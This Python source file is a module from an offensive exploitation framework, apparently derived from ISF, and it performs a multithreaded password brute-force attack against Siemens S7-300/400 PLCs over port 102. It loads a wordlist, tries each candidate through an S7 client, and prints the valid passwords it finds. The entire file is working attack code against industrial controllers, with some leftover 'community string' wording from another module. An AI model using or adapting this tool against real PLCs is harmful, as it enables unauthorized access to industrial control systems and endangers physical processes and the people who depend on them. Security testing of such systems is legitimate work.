import threading

from scapy.all import conf

import Base.Validators as Validators
import Wordlists
from Base.Exploits import Exploit, Option
from Modules.Clients.S7Client import Exploit as S7Client
from Utils import multi, print_error, print_success, print_status, printTable, boolify, LockedIterator


class Exploit(Exploit):
    __info__ = {
        'name': 'credentials/s7/bruteforce',
        'display_name': 'S7 PLC Password Bruteforce',
        'description': 'Module performs bruteforce attack against S7 300/400 Device. '
                       'If valid password string is found, it is displayed to the user.',
        'authors': [
            'wenzhe zhu <jtrkid[at]gmail.com>',
            'D0ubl3G <d0ubl3g[at]protonmail.com>',
        ],
        'references': [
            'https://github.com/dark-lbp/isf',
        ],
        'devices': [
            'Siemens S7-300',
            'Siemens S7-400'
        ],
    }

    target = Option('', 'Target address e.g. 192.168.1.1', validators=Validators.ipv4)
    port = Option(102, 'Target Port', validators=Validators.integer)
    rack = Option(0, 'CPU rack number.', validators=Validators.integer)
    slot = Option(2, 'CPU slot number.', validators=Validators.integer)
    password = Option(Wordlists.passwords, 'password string or file with community strings (file://)')
    threads = Option(3, 'Number of threads')
    verbose = Option(0, 'Verbose scapy output. 1: display, 0: hide', validators=Validators.choice([0, 1]))
    stop_on_success = Option('yes', 'Stop on first valid community string')

    strings = []

    def run(self):
        conf.verb = int(self.verbose)
        self.strings = []
        self.attack()

    @multi
    def attack(self):
        # todo: check if service is up
        if self.password.startswith('file://'):
            s7_pass = open(self.password[7:], 'r')
        else:
            s7_pass = [self.password]

        collection = LockedIterator(s7_pass)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.strings):
            print_success("Credentials found!")
            headers = ("Target", "Port", "password")
            printTable(headers, *self.strings)
        else:
            print_error("Valid password not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbose)
        name = threading.current_thread().name

        print_status(name, 'thread is starting...', verbose=module_verbosity)
        s7_client = S7Client()
        s7_client.connect()
        if not module_verbosity:
            s7_client.logger.setLevel(50)
        while running.is_set():
            try:
                string = data.next().strip()
                if len(string) > 8:
                    continue
                s7_client.check_privilege()
                if s7_client.protect_level == 1:
                    print_error("Target didn't set password.")
                    return
                s7_client.auth(string)
                if s7_client.authorized:
                    if boolify(self.stop_on_success):
                        running.clear()
                    print_success("Target: {}:{} {}: Valid password string found - String: '{}'".format(
                        self.target, self.port, name, string), verbose=module_verbosity)
                    self.strings.append((self.target, self.port, string))

                else:
                    print_error("Target: {}:{} {}: Invalid community string - String: '{}'".format(
                        self.target, self.port, name, string), verbose=module_verbosity)

            except StopIteration:
                break

        print_status(name, 'thread is terminated.', verbose=module_verbosity)
